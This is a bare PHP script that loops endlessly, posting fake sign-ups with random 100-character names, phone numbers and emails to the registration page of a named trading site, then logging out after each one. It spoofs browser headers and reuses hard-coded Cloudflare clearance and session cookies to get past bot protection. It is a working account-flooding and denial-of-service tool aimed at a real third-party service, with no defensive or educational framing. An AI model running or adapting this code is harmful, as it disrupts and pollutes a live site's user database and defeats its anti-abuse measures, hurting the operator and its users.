$host = "accounts.4xincome.com";
$path = "/registration.php";
while(1)
        {
				$post_data = 'country=DE&state=' .genrandstring(). '&first_name=' .genrandstring(). '&last_name=' .genrandstring(). '&phone=63521' .rand(100000,999999). '&email=asuhdih' .rand(100000,999999). '%40tutanota.com&password=q1w2e3&con_password=q1w2e3&type_of_account=1&referer_code=&ib_code=&reg_type=0';
                $socket = fsockopen("ssl://".$host, 443, $errno, $errstr, 15);
                $http = "POST {$path} HTTP/1.1\r\n";
                $http .= "Host: " .$host. "\r\n";
                $http .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0\r\n";
                $http .= "Accept: */*\r\n";
                $http .= "Accept-Language: en-US,en;q=0.5\r\n";
                $http .= "Referer: https://" .$host. "/registration.php\r\n";
                $http .= "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n";
                $http .= "X-Requested-With: XMLHttpRequest\r\n";
                $http .= "Content-Length: " .strlen($post_data). "\r\n";
                $http .= "Connection: close\r\n";
                $http .= "Cookie: __cfduid=d4f9a7ad1fbbda06f3775688e9ca479181544621882; qtrans_front_language=en; PHPSESSID=o6kfvobo658ai5nm3jtjp92crf; TawkConnectionTime=0; cf_clearance=c1e087416e5bda4bea2b0f03c9a37d5f0889e2b3-1544637389-1800-150; __tawkuuid=e::4xincome.com::D25c8oebRs6GszGOoC0qyC+D3aWMPfuFff5vTuXtFdLhB4Ka4gI8pQksWEr3miUK::2\r\n\r\n";
                $http .= $post_data . "\r\n";

                fwrite($socket, $http);

                $contents = "";
                #while (!feof($socket)) {
                #        $contents.= fgets($socket, 4096);
                #}
				#echo $contents;
                fclose($socket);
                #echo(".");
				logout();

        }
function logout()
{
				global $cookie;
				global $host;
	            $socket = fsockopen("ssl://".$host, 443, $errno, $errstr, 15);
                $http = "GET /logout.php HTTP/1.1\r\n";
                $http .= "Host: " .$host. "\r\n";
                $http .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0\r\n";
                $http .= "Accept: */*\r\n";
                $http .= "Accept-Language: en-US,en;q=0.5\r\n";
                $http .= "Referer: https://" .$host. "/registration.php\r\n";
                $http .= "X-Requested-With: XMLHttpRequest\r\n";
                $http .= "Connection: close\r\n";
                $http .= "Cookie: " .$cookie. "\r\n\r\n";

                fwrite($socket, $http);

                #$contents = "";
                #while (!feof($socket)) {
                #        $contents.= fgets($socket, 4096);
                #}

                fclose($socket);
}

function genrandstring()
{
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $result = '';
    for ($i = 0; $i <100; $i++)
        $result .= $characters[mt_rand(0, 61)];
    return $result;
}
